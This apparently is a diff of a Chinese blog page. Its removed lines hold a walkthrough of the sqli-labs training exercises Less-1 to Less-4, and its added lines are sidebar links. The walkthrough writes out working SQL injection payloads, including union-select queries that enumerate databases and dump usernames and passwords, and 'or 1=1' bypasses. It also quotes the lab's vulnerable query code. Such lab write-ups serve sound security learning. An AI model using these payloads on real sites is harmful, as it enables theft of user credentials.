-<p><img src="/2022/01/30/Less1-Less4/image-20220131010213078.png" alt="image-20220131010213078"></p>
-<p>爆所有的数据库：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(schema_name),3  from information_schema.schemata  --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131010522814.png" alt="image-20220131010522814"></p>
-<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><p>由于爆出所在数据库名security，爆表名：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(table_name),3  from information_schema.tables  --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131011039561.png" alt="image-20220131011039561"></p>
-<p>当前所在库的表：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(table_name),3  from information_schema.tables  where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131011254814.png" alt="image-20220131011254814"></p>
-<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><p>可以看到users这张表是存放用户名的表，接下来利用回显点3爆出列：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;) from information_schema.tables  where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131012812223.png" alt="image-20220131012812223"></p>
-<p>爆表名语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>爆列名语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><p>可以看到列的字段中出现了username和password两个字段，接下来爆用户名和密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from security.users--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131013610374.png" alt="image-20220131013610374"></p>
-<p>爆用户名语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username) from security.users</span><br></pre></td></tr></table></figure>
-
-<p>爆密码语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(password) from security.users</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="Lees-2（数字型注入）"><a href="#Lees-2（数字型注入）" class="headerlink" title="Lees-2（数字型注入）"></a>Lees-2（数字型注入）</h3><p>##0x00</p>
-<p>先进行判断，执行下列语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-2/?id=2</span><br></pre></td></tr></table></figure>
-
-<p>页面正常</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201004057893.png" alt="image-20220201004057893"></p>
-<h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-2/?id=2  and 1=2 --+</span><br></pre></td></tr></table></figure>
-
-<p>页面异常，可得知为数字型注入。</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201004229348.png" alt="image-20220201004229348"></p>
-<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>判断字段数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-2/?id=2  order by 4 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220201004438346.png" alt="image-20220201004438346"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-2/?id=2  order by 3 --+</span><br></pre></td></tr></table></figure>
-
-<p>页面正常。</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201004525522.png" alt="image-20220201004525522"></p>
-<h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h2><p>后续操作和字符型注入一样。</p>
-<hr>
-<h3 id="Lees-3"><a href="#Lees-3" class="headerlink" title="Lees-3"></a>Lees-3</h3><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>使用?id=’进行尝试注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-3/?id=&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>注入代码后，我们得到像这样的一个错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MySQL server version for the right syntax to use near ””) LIMIT 0,1′</span><br></pre></td></tr></table></figure>
-
-<p>这里它意味着，开发者使用的查询是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select login_name, select password from table where id= (‘our input here’)</span><br></pre></td></tr></table></figure>
-
-<p>而源码当中也是如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220201012339751.png" alt="image-20220201012339751"></p>
-<h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p>因此可以尝试这样注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-3/?id=1&#x27;)--+</span><br></pre></td></tr></table></figure>
-
-<p>页面返回正常</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201012811806.png" alt="image-20220201012811806"></p>
-<h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>接下来可以判断字段数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-3/?id=1&#x27;) order by 3 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220201014121063.png" alt="image-20220201014121063"></p>
-<h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>判断回显点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-3/?id=-1&#x27;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220201014321625.png" alt="image-20220201014321625"></p>
-<h2 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h2><p>其实除了?id=1’)注入以外，根据源码可以判断出其他的注入语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or &#x27;1&#x27;=(&#x27;1&#x27;</span><br><span class="line">) or 1=1 --+</span><br></pre></td></tr></table></figure>
-
-<p>第一句**’) or ‘1’=(‘1’**只要使SQL语句的语法正确，即使括号配对即可成功注入；</p>
-<p>第二句) **or 1=1 –+<strong>通过注释符把后面的</strong>‘)**注释掉即可。</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201015418821.png" alt="image-20220201015418821"></p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201015108788.png" alt="image-20220201015108788"></p>
-<h2 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h2><p>其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 添加） 即’) </p>
-<hr>
-<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><h2 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h2><p>使用以下代码进行注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-4/?id=1&quot;</span><br></pre></td></tr></table></figure>
-
-<p>注入代码后，我们得到像这样的一个错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQ L server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line</span><br></pre></td></tr></table></figure>
-
-<p>这里它意味着，代码当中对 id 参数进行了 “” 和 () 的包装。</p>
-<p>查看源代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>第一行id进行了””包装，之后第二行进行了()包装</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201021526614.png" alt="image-20220201021526614"></p>
-<h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p>再用如下代码注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-4/?id=1&quot;) --+</span><br></pre></td></tr></table></figure>
-
-<p>页面返回正常</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220201021849009.png" alt="image-20220201021849009"></p>
-<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>判断字段数：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-4/?id=1&quot;)  order by 4--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220201022028864.png" alt="image-20220201022028864"></p>
-<h2 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h2><p>与Less-3一样，可成功注入的有：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“) or ”1”=(“1</span><br><span class="line">“) or 1=1 --+</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><p>其余的 payload 与 less1 中一致，只需要将 less-1 中的 ‘ 更换为 “)。</p>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2022/01/30/Less1-Less4/">
-    <time datetime="2022-01-30T15:59:34.000Z" class="entry-date">
-        2022-01-30
-    </time>
-</a>
-    
-    
-    </footer>
-</article>
-
-
-
-
-
-
-  
   
     <nav id="pagination">
       <nav id="page-nav">
@@ -1467,6 +1449,10 @@
       <ul>
         
           <li>
+            <a href="/2022/02/07/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5/">SQL注入-Oracle等注入</a>
+          </li>
+        
+          <li>
             <a href="/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/">POST注入-HTTP头注入</a>
           </li>
         
@@ -1480,10 +1466,6 @@
         
           <li>
             <a href="/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/">SQL注入-Less8-Less10</a>
-          </li>
-        
-          <li>
-            <a href="/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/">文件导入导出-SQL靶场</a>
           </li>
         
       </ul>
